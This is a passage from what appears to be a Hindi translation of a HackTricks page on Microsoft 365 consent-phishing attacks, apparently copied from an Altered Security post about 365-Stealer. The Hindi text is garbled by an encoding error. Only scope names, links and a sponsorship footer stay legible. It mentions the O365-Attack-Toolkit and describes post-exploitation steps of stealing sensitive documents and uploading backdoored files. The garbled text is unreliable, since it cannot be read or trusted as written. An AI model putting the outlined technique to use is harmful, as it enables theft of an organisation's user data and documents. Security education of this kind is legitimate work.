рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ **рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди** рдЧреНрд░рд╛рдл рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рд▓рд┐рдП рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рд╕реНрдХреЛрдкреНрд╕ рд╣реЛрдВрдЧреЗ: `User.Read` рдФрд░ `User.ReadBasic.All` (рдЕрдиреБрд░реЛрдзрд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ)ред рдЖрдк рдЕрдиреНрдп рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ (рд▓реЗрдХрд┐рди рдЗрдиреНрд╣реЗрдВ рдкрд░реНрдпрд╛рдкреНрдд рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рд╕реЗ рдЖрдк рд╕рдВрдЧрдарди рдореЗрдВ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

рдЖрдк рдЗрд╕ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рддрдХ рдкрд╣реБрдВрдЪ рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдмреИрдХрдбреЛрд░реНрдб рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рд╕рдВрджрд░реНрдн

* рдпрд╣ рдкреЛрд╕реНрдЯ [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) рд╕реЗ рдХреЙрдкреА рдХреА рдЧрдИ рд╣реИ

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣](https://discord.gg/hRep4RUj7f) рдпрд╛ [рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
